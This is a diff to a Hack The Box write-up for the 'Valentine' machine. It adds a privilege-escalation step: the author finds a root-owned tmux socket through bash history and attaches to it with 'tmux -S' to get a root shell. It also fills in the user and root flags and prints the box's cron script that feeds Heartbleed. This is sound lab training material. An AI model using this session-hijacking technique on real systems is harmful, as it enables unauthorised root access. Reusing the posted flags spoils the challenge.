@@ -1,5 +1,15 @@
 # [08 - Valentine](https://app.hackthebox.com/machines/Valentine)
 
+  * [description](#description)
+  * [walkthrough](#walkthrough)
+    * [recon](#recon)
+    * [80](#80)
+    * [hype_key](#hype_key)
+    * [decode](#decode)
+    * [1+1 = 2](#1+1-=-2)
+    * [pivot](#pivot)
+    * [extra credit](#extra-credit)
+  * [flag](#flag)
 ![Valentine.png](Valentine.png)
 
 ## description
@@ -441,9 +451,65 @@ e6710a5464769fd5fcd216e076961750
 
 user down
 
+### pivot
+
+```
+hype@Valentine:~$ cat .bash_history
+
+exit
+exot
+exit
+ls -la
+cd /
+ls -la
+cd .devs
+ls -la
+tmux -L dev_sess
+tmux a -t dev_sess
+tmux --help
+tmux -S /.devs/dev_sess
+exit
+
+hype@Valentine:~$ ls -la /.devs/
+total 8
+drwxr-xr-x  2 root hype 4096 Jul 26 15:28 .
+drwxr-xr-x 26 root root 4096 Feb  6  2018 ..
+srw-rw----  1 root hype    0 Jul 26 15:28 dev_sess
+```
+
+ok, so that looks like the session we need to get
+
+```
+tmux -S /.devs/dev_sess
+...
+root@Valentine:/home/hype# ls /root/
+curl.sh  root.txt
+root@Valentine:/home/hype# cat /root/root.txt
+f1bb6d759df1f272914ebbc9ed7765b2
+```
+
+root down.
+
+### extra credit
+
+```
+root@Valentine:/home/hype# cat /root/curl.sh
+/usr/bin/curl -i -s -k  -X 'POST' \
+    -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Referer: https://127.0.0.1/decode.php' -H 'Content-Type: application/x-www-form-urlencoded' \
+    -b 'PHPSESSID=n12acqnj0efoq5etm5d12k6j85' \
+    --data-binary $'text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' \
+    'https://127.0.0.1/decode.php' >  /dev/null 2>&1
+root@Valentine:/home/hype# crontab -l
+...
+*/2 * * * * /root/curl.sh
+```
+
+so that's how they are ensuring that the memory heartbleed leaks includes the password we got
+
+
 ## flag
 
 ```
-user:
-root:
+user:e6710a5464769fd5fcd216e076961750
+root:f1bb6d759df1f272914ebbc9ed7765b2
 ```
